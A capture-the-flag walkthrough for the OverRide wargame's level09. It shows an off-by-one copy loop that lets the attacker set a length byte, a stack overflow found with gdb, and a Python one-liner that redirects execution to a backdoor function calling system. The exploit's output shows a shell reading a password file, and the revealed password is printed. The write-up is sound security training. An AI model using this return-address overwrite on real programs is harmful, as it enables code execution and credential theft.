## WALKTHROUGH - LEVEL09

---

The program waits for a username and a password, but there is a **small error in
the code** which allows us to **overwrite by 1 byte the username buffer** and so we can **control the variable size in** the limit of \xff (255).

```c
	index = 0;
	while (index <= 40 && username[index] != 0)
	{
		msg->username[index] = username[index];
		index++;
	}
```

So we can **fill the username buffer** with an **offset of 40**, **followed by "\xff"**, and the program will **copy at most 255 bytes on the content buffer** instead of 140.

---

We then need to **find the offset to overwrite RIP**:

- `offset = RETURN address - start of buffer`

or

- `offset = EBP address - start of the buffer + 0x8`

So we put a **breakpoint after the stack allocation** on the **handle_msg function**. We know **the buffer is on the 1st address of the stack** so:

```gdb
Breakpoint 1, 0x00005555555548cb in handle_msg ()
(gdb) info reg $esp $ebp
esp            0xffffe3f0	-7184
ebp            0xffffe4b0	-6992
(gdb) p 0xffffe4b0-0xffffe3f0+8
$5 = 200
```

So we need to use **an offset of 200 bytes** before **having access to the RETURN address**.

---

We can also see that there is a **secret_backdoor function** that will **open the content of a buffer it will receive with system**. Its address is:

```gdb
(gdb) p *secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

So we can **overwrite the RETURN address** of handle_msg **with the address of the secret_backdoor** function in little endian:

```sh
level09@OverRide:~$ cat <(python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"') - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
/bin/sh
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
level09@OverRide:~$ su end
Password: 
end@OverRide:~$ cat end
GG !
```
